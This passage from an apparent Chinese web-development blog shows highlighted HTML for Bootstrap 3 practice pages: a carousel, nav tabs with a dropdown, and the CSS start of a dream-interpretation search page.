class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">alt</span>=<span class=\"string\">&quot;&quot;</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://cdn.ibootstrap.cn/lorempixel.com/1600/500/sports/3/default.jpg&quot;</span> /&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;carousel-caption&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">h4</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\tThird Thumbnail label</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">h4</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\tCras justo odio, dapibus ac facilisis in, egestas eget quam. Donec id elit non mi porta gravida at eget metus. Nullam id dolor id nibh ultricies vehicula ut id elit.</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span> <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;left carousel-control&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#carousel-449328&quot;</span> <span class=\"attr\">data-slide</span>=<span class=\"string\">&quot;prev&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;glyphicon glyphicon-chevron-left&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span> <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;right carousel-control&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#carousel-449328&quot;</span> <span class=\"attr\">data-slide</span>=<span class=\"string\">&quot;next&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;glyphicon glyphicon-chevron-right&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/3.0.1/js/bootstrap.min.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"bootstrap-html\"><a href=\"#bootstrap-html\" class=\"headerlink\" title=\"bootstrap.html\"></a>bootstrap.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">www.bootcss.com</span></span><br><span class=\"line\"><span class=\"comment\">https://www.bootcss.com/p/layoutit/#</span></span><br><span class=\"line\"><span class=\"comment\">http://www.ibootstrap.cn/</span></span><br><span class=\"line\"><span class=\"comment\">https://www.bootcdn.cn/</span></span><br><span class=\"line\"><span class=\"comment\">https://www.bootcdn.cn/twitter-bootstrap/3.0.1/</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">--&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/3.0.1/css/bootstrap.min.css&quot;</span> <span class=\"attr\">rel</span>=<span class=\"string\">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;container&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;row clearfix&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;col-md-3 column&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">alt</span>=<span class=\"string\">&quot;140x140&quot;</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;../images/163057jyrg229qerdeciod.jpg&quot;</span> /&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;col-md-9 column&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">h3</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\th3. 这是一套可视化布局系统.</span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">h3</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;row clearfix&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;col-md-12 column&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;nav nav-tabs&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;active&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#&quot;</span>&gt;</span>首页<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#&quot;</span>&gt;</span>简介<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;disabled&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#&quot;</span>&gt;</span>信息<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;dropdown pull-right&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#&quot;</span> <span class=\"attr\">data-toggle</span>=<span class=\"string\">&quot;dropdown&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;dropdown-toggle&quot;</span>&gt;</span>下拉<span class=\"tag\">&lt;<span class=\"name\">strong</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;caret&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">strong</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;dropdown-menu&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#&quot;</span>&gt;</span>操作<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#&quot;</span>&gt;</span>设置栏目<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#&quot;</span>&gt;</span>更多设置<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;divider&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#&quot;</span>&gt;</span>分割线<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;row clearfix&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;col-md-12 column&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;carousel slide&quot;</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;carousel-570598&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">ol</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;carousel-indicators&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">data-slide-to</span>=<span class=\"string\">&quot;0&quot;</span> <span class=\"attr\">data-target</span>=<span class=\"string\">&quot;#carousel-570598&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">data-slide-to</span>=<span class=\"string\">&quot;1&quot;</span> <span class=\"attr\">data-target</span>=<span class=\"string\">&quot;#carousel-570598&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">data-slide-to</span>=<span class=\"string\">&quot;2&quot;</span> <span class=\"attr\">data-target</span>=<span class=\"string\">&quot;#carousel-570598&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;active&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">ol</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;carousel-inner&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">alt</span>=<span class=\"string\">&quot;&quot;</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;../images/443121.jpg&quot;</span> /&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;carousel-caption&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">h4</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\tFirst Thumbnail label</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">h4</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\tCras justo odio, dapibus ac facilisis in, egestas eget quam. Donec id elit non mi porta gravida at eget metus. Nullam id dolor id nibh ultricies vehicula ut id elit.</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">alt</span>=<span class=\"string\">&quot;&quot;</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;../images/446213.jpg&quot;</span> /&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;carousel-caption&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">h4</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\tSecond Thumbnail label</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">h4</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\tCras justo odio, dapibus ac facilisis in, egestas eget quam. Donec id elit non mi porta gravida at eget metus. Nullam id dolor id nibh ultricies vehicula ut id elit.</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item active&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">alt</span>=<span class=\"string\">&quot;&quot;</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;../images/icons2.jpg&quot;</span> /&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;carousel-caption&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">h4</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\tThird Thumbnail label</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">h4</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\tCras justo odio, dapibus ac facilisis in, egestas eget quam. Donec id elit non mi porta gravida at eget metus. Nullam id dolor id nibh ultricies vehicula ut id elit.</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span> <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;left carousel-control&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#carousel-570598&quot;</span> <span class=\"attr\">data-slide</span>=<span class=\"string\">&quot;prev&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;glyphicon glyphicon-chevron-left&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span> <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;right carousel-control&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#carousel-570598&quot;</span> <span class=\"attr\">data-slide</span>=<span class=\"string\">&quot;next&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;glyphicon glyphicon-chevron-right&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/3.0.1/js/bootstrap.min.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Practice周公解梦O-html\"><a href=\"#Practice周公解梦O-html\" class=\"headerlink\" title=\"Practice周公解梦O.html\"></a>Practice周公解梦O.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#container</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">400px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin</span>: <span class=\"number\">0</span> auto; <span class=\"comment\">/* 内容居中 */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">padding-top</span>: <span class=\"number\">120px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-align</span>: center;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#container</span> <span class=\"selector-tag\">input</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">font-size</span>: <span class=\"number\">22px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">line-height</span>: <span class=\"number\">30px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">30px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">outline</span>: none;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#keyword</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">300px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border</span>: none;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-align</span>: center;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border-bottom</span>: <span class=\"number\">1px</span> solid gray;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#search</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">80px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">30px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">background-color</span>: coral;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">color</span>: white;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">vertical-align</span>: bottom;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">cursor</span>: pointer;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border</span>: none;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#result</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">400px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin</span>: <span class=\"number\">10px</span> auto; <span class=\"comment\">/* 内容居中 */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">font-size</span>: <span class=\"number\">18px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t</span><span class=\"tag\">&lt;/<span 